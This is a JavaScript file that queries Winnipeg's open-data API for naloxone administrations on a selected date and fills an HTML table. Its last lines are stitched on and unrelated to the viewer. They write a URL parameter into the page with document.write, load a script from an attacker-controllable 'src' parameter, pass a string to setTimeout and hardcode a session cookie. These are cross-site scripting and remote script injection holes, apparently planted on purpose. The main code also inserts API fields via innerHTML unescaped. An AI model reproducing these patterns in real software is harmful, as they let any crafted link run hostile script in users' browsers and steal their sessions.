async function fetchNaloxoneAdministrationData() {
    // Get the selected date from the input field
    const dateInput = document.getElementById('dateInput');
    const selectedDate = dateInput.value;

    try {
        // Validate if a date is selected
        if (!selectedDate) {
            alert('Please select a date.');
        }
        // Trim dispatch_date floating timestamp to ymd(YYYY-MM-DD) to match html date input format and compare to selected date
        const dateArgument = `?$where=date_trunc_ymd(dispatch_date)='${selectedDate}'`;

        // fetch data from the API with the date filter
        const response = await fetch(`https://data.winnipeg.ca/resource/qd6b-q49i.json${dateArgument}`);
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        const data = await response.json();
        console.log(`Records for ${selectedDate}:`, data);

        // Validate that there is at least one record for the selected date
        if (data.length === 0) {
            alert(`No naloxone administrations recorded on ${selectedDate}.`);
            console.error(`No naloxone administrations recorded on ${selectedDate}.`);
        }

        // Get the table body element
        const resultsBody = document.getElementById('resultsBody');
        
        // Clear old rows
        resultsBody.innerHTML = '';

        // Append each record as a new row to the table
        data.forEach(record => {
            const row = document.createElement('tr');
            row.innerHTML = `
                <td>${record.id}</td>
                <td>${record.incident_number}</td>
                <td>${record.dispatch_date}</td>
                <td>${record.patient_number}</td>
                <td>${record.age}</td>
                <td>${record.gender}</td>
                <td>${record.ward}</td>
                <td>${record.neighbourhood_id}</td>
                <td>${record.neighbourhood}</td>
                <td>${record.naxolone_administrations}</td>
            `;
            resultsBody.appendChild(row);
        });

    } catch (error) {
        console.error('Error fetching naloxone administration data:', error);
    }
}

// Attach event listener to the button
const fetchData = document.getElementById('fetchData');
fetchData.addEventListener('click', fetchNaloxoneAdministrationData);

const input = new URLSearchParams(window.location.search).get("msg");
document.write(input);

const src = new URLSearchParams(window.location.search).get("src");
const script = document.createElement("script");
script.src = src;
document.body.appendChild(script);

const timeoutinput = new URLSearchParams(window.location.search).get("cmd");
setTimeout(input, 1000);

document.cookie = "sessionId=12345";
